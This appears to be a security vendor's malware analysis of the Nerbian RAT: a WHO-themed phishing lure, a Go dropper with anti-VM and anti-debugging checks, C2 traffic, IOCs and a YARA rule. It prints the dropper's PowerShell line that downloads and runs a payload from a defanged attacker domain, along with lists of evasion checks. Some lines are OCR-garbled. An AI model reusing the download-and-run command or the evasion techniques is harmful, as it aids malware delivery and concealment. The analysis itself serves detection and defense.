Nerbia is a fictional place from the\nnovel Don Quixote.\n\n## Overview\n\nThe newly identified Nerbian RAT leverages multiple anti-analysis components spread across several stages, including multiple open-source\nlibraries. It is written in operating system (OS) agnostic Go programming language, compiled for 64-bit systems, and leverages several\nencryption routines to further evade network analysis. Go is an increasingly popular language used by threat actors, likely due to its lower\nbarrier to entry and ease of use.\n\n## Campaign Details\n\nStarting on April 26, 2022, Proofpoint researchers observed a low volume (less than 100 messages) email-borne malware campaign sent to\nmultiple industries. The threat disproportionately impacts entities in Italy, Spain, and the United Kingdom. The emails claimed to be\nrepresenting the World Health Organization (WHO) with important information regarding COVID-19. The malware sample was also noted by\n\n\n-----\n\n[secu ty esea c e p 0 y e o](https://twitter.com/pr0xylife/status/1519704793593307136) tte oo po t esea c e s obse ed t e o o g d cato s a d attac e ts\n\n**From: who.inter.svc@gmail[.]com, announce@who-international[.]com**\n\n**Subjects: WHO, World Health Organization**\n\n**Attachment Names and Types: who_covid19.rar with who_covid19.doc inside, covid19guide.rar with covid19guide.doc inside, covid-19.doc**\n\nThe messages that purport to be from WHO and include safety measures relating to COVID-19 include an attached Word document containing\nmacros.\n\n_Figure 1: Example email that purports to be from WHO._\n\n_Figure 2: Attached Word document._\n\nThe emails contain a macro-laden Word attachment (sometimes compressed with RAR). When macros are enabled, the document reveals\ninformation relating to COVID-19 safety, specifically about self-isolation and caring for individuals with COVID-19. Interestingly, the lure is\nsimilar to themes used in the early days of the pandemic in 2020, specifically spoofing the WHO to distribute information about the virus.\n\n\n-----\n\n_Figure 3: Screenshot of the document lure containing COVID-19 guidance, specifically what users see when they enable macros on the_\n_malicious document._\n\nIn addition to masquerading as the WHO, the document also appears to contain logos from the Health Service Executive (HSE), Government\nof Ireland, and National Council for the Blind of Ireland (NCBI).\n\n_Figure 4: Document with additional logos related to government and non-profit entities_\n\n\n-----\n\n## ttac at\n\nWhen users enable macros on this document, the document executes an embedded macro that drops a .bat file with the following contents:\n\npowershell IWR -Uri hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog -OutFile C:\\Users\\\n\n[username]\\AppData\\Roaming\\UpdateUAV.exe ;C:\\Users\\[username]\\AppData\\Roaming\\UpdateUAV.exe\n\nThis batch file performs a PowerShell Invoke Web Request (IWR) to the URL:\n```\nhxxps://www[.]fernandestechnical[.]com/pub/media/gitlog,\n\n```\nIt renames the downloaded file to UpdateUAV.exe, and drops it into:\n```\nC:\\Users\\[current user]\\AppData\\Roaming\\UpdateUAV.exe.\n\n## Dropper: UpdateUAV.exe\n\n```\nUpdateUAV.exe is the payload initially downloaded from the malicious Word document. It is a 64-bit executable, written in Golang, 3.5MB in\nsize, and UPX packed. Executable files created in the Go language tend to be slightly larger than most other executable files. Likely, this\nmalware is packed with UPX to reduce the overall size of the executable being downloaded. Unpacked, the file is 6.6MB in total.\n\n_Figure 5: The UpdateUAV.exe payload is packed with UPX, likely in an effort to reduce its size._\n\nProofpoint analysts extracted decrypted data during execution. The resulting memory revealed additional information about the sample.\n\n## Functionality\n\nUpdateUAV.exe is a dropper for Nerbian RAT. This determination was made through multiple different observations. First is the string\nembedded in the sample:\n\nK:/W_Work/Golang/src/RAT_Dropper/main_gen.go\n\nAccording to the source path, this executable is a dropper. Proofpoint named this malware “Nerbian RAT” based on one of the function names\nin the dropper. The specific function name is “main_downloadNerbian” as shown in the following figure.\n\n_Figure 6 : Nerbian RAT main function code._\n\nThere are additional references to \"Nerbian\" in some of the Go functions scattered throughout the binary.\n\n\n-----\n\n_Figure 7: Functions referring to the RAT the dropper is meant to download and store on the compromised system._\n\n## Code Reuse\n\nMost software developers, including malware developers, use existing software packages. The UpdateUAV executable, which is a dropper for\nNerbian RAT, features a lot of code re-use, with strings referencing various GitHub projects:\n\ngithub.com/go-ole/go-ole – Go bindings for Windows COM (Component Object Model – inter-process communication)\n\ngithub.com/gonutz/w32/v2 – Go bindings for the Win32 API\n\ngithub.com/mitchellh/go-ps – Library implements OS-specific APIs to list and manipulate processes\n\ngithub.com/StackExchange/wmi – Go package for Windows WMI, providing a WQL interface\n\nOut of all these references to external projects the most interesting is:\n\ngithub.com/p3tr0v/chacal/\n\n## Anti-Debug, Anti-VM, Anti-Forensics\n\n_Figure 8: Chacal GitHub page._\n\nChacal is described as, “Golang anti-vm framework for Red Team and Pentesters”. However, there are several functions and references in the\nproject designed to make debugging and reverse engineering more difficult as well.\n\nThe dropper will stop execution if it encounters any of the following conditions:\n\nThe size of the hard disk on the system is less than a certain size. The default defined in Chacal is 100GB.\nThe name of the hard disk, according to WMI contains one of the following strings:\n\n\"virtual\"\n\"vbox\"\n\"vmware\"\n\n\n-----\n\ne C add ess que ed etu s a y o t e o o g OU a ues\n00:0c:29, 00:50:56, 08:00:27, 52:54:00, 00:21:F6, 00:14:4F, 00:0F:4B, 00:10:E0, 00:00:7D, 00:21:28, 00:01:5D, 00:21:F6,\n00:A0:A4, 00:07:82, 00:03:BA, 08:00:20, 2C:C2:60, 00:10:4F, 00:0F:4B, 00:13:97, 00:20:F2, 00:14:4F\nAny of the following reverse engineering/debugging programs are encountered in the process list:\n\nprocesshacker.exe, procmon.exe, pestudio.exe, procmon64.exe, x32dbg.exe, x64dbg.exe, CFF Explorer.exe, procexp64.exe,\nprocexp.exe, pslist.exe, tcpview.exe, tcpvcon.exe, dbgview.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe, ollydbg.exe, agent.py,\nautoruns.exe, autorunsc.exe, filemon.exe, regmon.exe, idaq.exe, idaq64.exe, ImmunityDebugger.exe, Wireshark.exe,\ndumpcap.exe, HookExplorer.exe, ImportREC.exe, PETools.exe, LordPE.exe, SysInspector.exe, proc_analyzer.exe,\nsysAnalyzer.exe, sniff_hit.exe, windbg.exe, joeboxcontrol.exe, joeboxserver.exe, joeboxserver.exe, ResourceHacker.exe,\nFiddler.exe, httpdebugger.exe\nAny of the following memory analysis/memory tampering programs are present in the process list:\n\nDumpIt.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe\nA time measurement function checks to see if the amount of time elapsed execution specific functions is deemed \"excessive\". If the time\nthreshold is reached, the malware assumes it is being debugged, and will exit.\n\nIn addition to the anti-reversing checks provided by Chacal, there are other anti-analysis checks present in the binary including:\n\nUses the IsDebuggerPresent API to determine if the executable is being debugged\nAppears to query for the following network interface names:\n\nIntel® PRO/1000 MT Network Connection\nLoopback Pseudo-Interface 1\nSoftware Loopback Interface 1\n\n## Download, Execution, and Persistence\n\nIn the case of analyzed sample, the dropper attempted to download its payload from:\n\nhxxps://www[.] fernandestechnical [.]com/pub/media/ssl\n\nAnd will save the RAT to:\n\nC:\\ProgramData\\USOShared\\MoUsoCore.exe\n\nNext, the dropper will attempt to establish a scheduled task named MicrosoftMouseCoreWork to start the RAT payload hourly to establish\npersistence.\n\nThe dropper's end-goal is to download the executable named SSL, save it as MoUsoCore.exe, and configure a scheduled task to run it hourly\nas its primary persistence mechanism.\n\n## Payload - MoUsoCore.exe\n\nMoUsoCore.exe is the name of the payload that the dropper binary, UpdateUAV.exe, attempts to download and establish persistence for. Like\nthe dropper itself, it is written in Go, and is UPX packed. The size of the binary in its packed state is 5.6MB, while in its unpacked state is\n9.2MB.\n\n## Functionality and Configuration Settings\n\nNerbian RAT seems to support a variety of different functions, most of which are dictated by encrypted configuration settings in the binary\nitself. Proofpoint identified various configuration settings this sample utilizes:\n\n\"185.121.139[.]249\"\n\nhttps://www[.]fernandestechnical[.]com/pub/health_check.php\n\n8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d\n\n\"100\"\n\n\\\\\\\\ProgramData\\\\\\\\Microsoft OneDrive\\\\\\\\setup\n\n\"rev.sav\"\n\n===Configuration===\n\ndefault_communication_protocol: %s\n\ndefault_conn_interval: %d\n\nb_use_alive_signal: %t\n\nstart_worktime: %d\n\nend_worktime: %d\n\nalive_interval: %d\n\nb use secondary host: %t\n\n\n-----\n\nb_use_s eep_ et a s e %t\ntime_sleep_filetransfer: %d\nretry_count_filetransfer: %d\nconnection_error_sleep_time: %d\nbpreflaged_use_backupserver: %t\nflagged_time_backupserver: %s\nswitch_backupserver_time: %d\nprimary_host: %s\nsecondary_host: %s\nprimary_http_proxyserver: %s\nsecondary_http_proxyserver: %s\nworking_directory: %s\nb_run_cmd_result_outfile: %t\nidle_state_limit_time: %d\nst:%d\nnt: %d\n\nMany of these strings pertain to setting operating parameters for the malware such as what hosts it communicates with, how often it checks in\nto the C2 domains and IP addresses with keep-alive messages, the malware’s preferred working directory, and the hours in which it operates,\nin addition to other parameters.\n\nIt's likely that 185[.]121[.]139[.]249 and hxxps://www[.]fernandestechnical[.]com/pub/health_check.php are the designated C2 backup domains\nand URI for keep-alives and check-ins.\n\n## Keylogging\n\nThe RAT appears to have the ability to log keystrokes and appears to write them, encrypted, to the rev.sav file mentioned in the configuration\nsettings above.\n\n## Screen Capture\n\nNot unlike the dropper, the RAT utilizes a lot of pre-existing Go code to perform many of its functions:\n\ngithub.com/lxn/win\n\ngithub.com/go-ole/go-ole\n\ngithub.com/StackExchange/wmi\n\ngithub.com/digitalocean/go-smbios/smbios\n\ngithub.com/AllenDang/w32.init\n\nAgain, out of all of these, one of the more interesting external references is to the following GitHub repo:\n\ngithub.com/kbinani/screenshot/\n\nThis repo is a Go library for performing screen captures on a variety of different operating systems.\n\n## C2 Communications\n\nAs with most modern malware families, this RAT prefers to handle its communications over SSL. Proofpoint observed two types of network\ntraffic. The first is a simple Heartbeat/Keep-Alive to the C2 domains/IP addresses.\n\n_Figure 9: The Heartbeat/Keep-alive traffic to the C2 domain/IP addresses. Please disregard the extra \"p\" at the end of /pub/health_check.php._\n\nAdditional communication observed was a POST request to the configured C2 domains and IP addresses with a large collection of HTTP form\ndata being uploaded in the request:\n\n\n-----\n\n_Figure 10: Notice the different names in the Content-Disposition field for each form in this POST request. All of this data is both base64_\n_encoded and encrypted, regardless of whether the C2 communication is happening over HTTP or HTTPS._\n\nForm-data names being posted to the C2 server include:\n\naddr_post – IP address posting to\n\nport_post – network port posting to\n\nauth_post – likely a per-session encryption key or password used after initializing the C2 communication\n\nsession_key – the only field that isn't encrypted. This is a combination of a string that serves as a sort of campaign identifier, a hash of values\nretrieved via the SMBIOS Golang module, and the operating system designation of the system talking to the C2 server (in this case\n\"windows\").\n\ndata_post – exfiltrated data from the victim host\n\nAll of the fields above, with exception of session_key form data field, utilize a unique encryption scheme. The first 70 bytes of the POST are\n\"garbage\", while the next 24 bytes contain an AES key that can be used to decrypt the remaining data. Proofpoint researchers developed a\nPython script that will enable decrypting this posted data:\n\nimport malduck\n\nimport binascii\n\ndata =\n\"BgxxweBaPoZVPcfLoQFSHMfqqeitJaZjoSKOBrhsCxtDMYGxPUHsKYcXetaTSJaSULtqZQAwoDiTrCtDpVKvaLxjZPSLcLBvlyREEguzuO0Z8119x\n\ndef decrypt_post_param(base64_encoded_content):\n\njunk = base64_encoded_content[:70]\n\nkey = base64_encoded_content[70:70+32]\n\nprint(\"[+] key: %s\" % key)\n\ncrypted_data = base64_encoded_content[70+32:].encode(\"utf-8\")\n\nbase64_decoded = malduck.base64.decode(crypted_data)\n\niv = key[:16].encode(\"utf-8\")\n\nfull_data = base64_decoded\n\nprint(\"[+] crypted data [%d]: %s\" % (len(full_data), binascii.hexlify(full_data)))\n\nreturn malduck.aes.cbc.decrypt(key.encode(\"utf-8\"), iv, full_data)\n\nprint(decrypt_post_param(data))\n\n\n-----\n\n_Figure 11: Python script for decrypting posted data._\n\nUsing the code above, users can decrypt the data being posted. In this instance, Proofpoint chose to decrypt the base64 encoded data from\nthe addr_post field from an internal sandbox run. Users will need to replace the data variable with the base64 encoded block they wish to\ndecrypt, or otherwise modify the script to accept input.\n\nAs mentioned above however, the session_key field is not encrypted, it is base64 encoded. What does this field contain?\n\n_Figure 12: The value of the session_key field is just a concated string, containing three values that are base64 encoded._\n\nWhen submitted to Cyberchef using the From Base64 recipe, the base64 encoded string:\n\nOGZmZTQ1MDU5N2NiYmZhNWE3MDNlMjNhOGI2YmJkYWVkYTc2YmFkZjJiMDM1ZTc1ZGU1ZmZkYjNhZjA3MjcwZDoyNWI0ZWJjYTRiYmM4M\n\nDecodes to:\n\n8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d:25b4ebca4bbc82ab5ae2e517c29d33e7:windows\n\nThis string contains three values, concatenated and delimited with the \":\" character. Proofpoint assesses the first value,\n8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d is some sort of an implant or campaign identifier, while\n[25b4ebca4bbc82ab5ae2e517c29d33e7 is a value derived from host identifier data collected using the go-smbios library mentioned above,](https://github.com/digitalocean/go-smbios/smbios)\nwhile the final value is the operating system of the compromised host (windows)\n\n_Figure 13: The process flow of Nerbian RAT_\n\n## Assessment\n\n\n-----\n\ns s a co p e p ece o a a e, co s st g o t ee stages\n\nMaldoc phishing lure\nDropper that performs a large variety of environment checking – anti-reversing and anti-VM checks\nNerbian RAT – encrypted configuration file, extreme care to ensure data is encrypted to the C2\n\nDespite all this complexity and care being taken to protect the data in transit and \"vet\" the compromised host, the dropper and the RAT itself do\nnot employ heavy obfuscation outside of the sample being packed with UPX, which it can be argued isn't necessarily for obfuscation, but to\nsimply reduce the size of the executable.\n\nAdditionally, much of the functionality of both the RAT and the dropper are easy to infer due to the strings referring to GitHub repositories –\nspecifically the Chacal and screenshot repositories exposes partial functionality of both the dropper and the RAT.\n\n## Why Nerbian RAT?\n\nAt first it was hard to find any references to \"Nerbian\" on the internet, until Proofpoint analysts came across this passage in Don Quixote:\n\n_“But turn thine eyes to the other side, and thou shalt see in front and_\n\n_in the van of this other army the ever victorious and never vanquished_\n\n_Timonel of Carcajona, prince of New Biscay, who comes in armour with_\n\n_arms quartered azure, vert, white, and yellow, and bears on his shield_\n\n_a cat or on a field tawny with a motto which says Miau, which is the_\n\n_beginning of the name of his lady, who according to report is the_\n\n_peerless Miaulina, daughter of the duke Alfeniquen of the Algarve; the_\n\n_other, who burdens and presses the loins of that powerful charger_\n\n_and bears arms white as snow and a shield blank and without any_\n\n_device, is a novice knight, a Frenchman by birth, Pierres Papin by_\n\n_name, lord of the baronies of Utrique; that other, who with_\n\n_iron-shod heels strikes the flanks of that nimble parti-coloured_\n\n_zebra, and for arms bears azure vair, is the mighty duke of Nerbia,_\n\n**_Espartafilardo del Bosque, who bears for device on his shield an_**\n\n**_asparagus plant with a motto in Castilian that says, Rastrea mi_**\n\n**_suerte.\"_**\n\nNerbia is a fictional place from the great novel Don Quixote. The knight from Nerbia had a shield with a crest of asparagus and a banner\nreading \"Try your luck\".\n\n\n-----\n\n_Figure 14: Nerbia is a fictional land from the novel Don Quixote. The Knight of Nerbia wore a shield with an asparagus crest with a Castilian_\n_Spanish motto that reads \"Rastrea Mi Suerte.\" Which roughly translates to \"Try your luck.\" In English. Please note that this crest is not_\n_associated with the novel and was created because Threat Research at Proofpoint likes to have fun._\n\nMany of the strings referencing Nerbia were located in the companion dropper (UpdateUAV.exe). There are no references to Nerbia in the RAT\npayload itself (MoUsoCore.exe). Proofpoint assesses with high confidence that the dropper and RAT were both created by the same entity,\nand while the dropper may be modified to deliver different payloads in the future, the dropper is statically configured to download and establish\npersistence for this specific payload at the time of analysis.\n\n## Indicators of Compromise\n\nFilename covid-19.doc\n\nMD5 Hash d7888fea6047b662a30bf00edac4c3ee\n\nSHA1 Hash 8137670512be55796f612e41602f505955b0bb0c\n\nSHA256 Hash ee1bbd856bf72a79221baa0f7e97aafb6051129905d62d74a37ae7754fccc3db\n\nFilename UpdateUAV.exe\n\n\nMD5\nHash\n\nSHA1\nHash\n\nSHA256\nHash\n\n\n9cca59eec5af63e42cd845b67cf6df89\n\n178aad6c7918cc495a908944e79143a913630890\n\n1b8c9e7c150bacd466fbe7f12b39883821f23b67cae0a427a57dc37e5ea4390f\n\n\n-----\n\nNotes Downloaded from hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog via Powershell Invoke Web Request (IWR) to\nC:\\Users\\[current_user]\\Appdata\\Roaming\\UpdateUAV.exe\n\n64-bit golang executable, UPX packed\n\nFilename MoUsoCore.exe\n\n\nMD5\nHash\n\nSHA1\nHash\n\nSHA256\nHash\n\n\n5d5bc970f975341558b8d2c225ca0115\n\n4f74826ed56cda233cfc12b86fd1b7da4a9f2e56\n\n902c65435b6b44cfda1156b0e7c6a30b2785fa4f2cbb9b1944a66f5146ec7aa5\n\n\nNotes Downloaded from hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog via Powershell Invoke Web Request (IWR) to\nC:\\Users\\[current_user]\\Appdata\\Roaming\\UpdateUAV.exe\n\n64-bit golang executable, UPX packed\n\nDomain www[.]fernandestechnical[.]com\n\nNotes hxxps://www[.]fernandestechnical[.]com/pub/health_check.php\n\nIP Address 185[.]121[.]139[.]249\n\nNotes Additional IP address identified in the Nerbian RAT (MoUsoCore.exe) configuration.\n\n**Detection**\n\n**Network**\n\nSnort and Suricata rules are available in the ETOPEN ruleset under SIDs:\n\n2036426 - ET MALWARE Nerbian RAT CnC Checkin\n\n2036427 - ET MALWARE Nerbian RAT Data Exfiltration\n\n**Static**\n\nThe Yara rule below should provide host-based static detection of the RAT payload:\n\nrule Nerbian_RAT\n\n{\n\nmeta:\n\nauthor = \"ptrouerbach\"\n\nreference = \"5e6c5a9fda2d20125f6f24e37e8a217a39ff0a5cfddc07ddfdb18049d9ea4597\"\n\nmalfamily = \"NerbianRAT\"\n\nstrings:\n\n$args_p = \"p-\" ascii\n\n$args_s = \"s-\" ascii\n\n$args_h = \"h-\" ascii\n\n$args_P = \"P-\" ascii\n\n$hardcoded_aes_key = { 17E87F581F1DF8D6129D65FD50CEB3DD6C4E1C223077CD7D4C595DA6C3DF92B2 }\n\n\n-----\n\n$param_auth = \"auth_post\" ascii\n\n$param_session = \"session_key\" ascii\n\n$param_data = \"data_post\" ascii\n\n$param_addr = \"addr_post\" ascii\n\n$param_port = \"port_post\" ascii\n\ncondition:\n\nuint16be(0) == 0x4D5A\n\nand ($hardcoded_aes_key or (all of ($param*) and all of ($args*)))\n\nand filesize < 10MB\n\n}\n\n**Additional Acknowledgements**\n\nProofpoint security researchers would like to thank security researcher pr0xylife sharing his observations of this threat on social media.\n\n\n-----",
